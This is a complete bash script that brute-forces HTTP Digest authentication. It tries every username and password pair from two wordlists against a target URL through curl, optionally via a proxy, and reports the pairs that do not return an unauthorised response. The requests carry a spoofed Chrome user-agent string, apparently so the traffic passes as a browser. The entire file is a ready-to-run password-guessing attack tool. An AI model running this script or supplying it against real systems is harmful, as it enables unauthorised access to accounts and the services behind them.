#!/bin/bash
# 
# Usage example : ./bruteforce-digestauth.sh userlist.txt passlist.txt https://ip:port
#
#
# Function to calculate the number of combinations
calculate_combinations() {
    local file1_lines=$(wc -l < "$1")
    local file2_lines=$(wc -l < "$2")
    local total_combinations=$((file1_lines * file2_lines))
    echo "Total combinations: $total_combinations"
}

proxy_param=""
if [ ! -z "$4" ]; then
    proxy_param="--proxy $4 --proxy-insecure"
fi

while IFS= read -r STRING1; do
    while IFS= read -r STRING2; do
        if curl -ik -s "$3" --digest -u "$STRING1":"$STRING2" -A "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36" $proxy_param | grep -i "unauth" ; then
            echo "[-] Wrong $STRING1:$STRING2"
            continue
        else
            echo "[+++] Found $STRING1:$STRING2"
            # exit 0
        fi
    done < "$2"
done < "$1"

# Call the function to calculate combinations
calculate_combinations "$1" "$2"

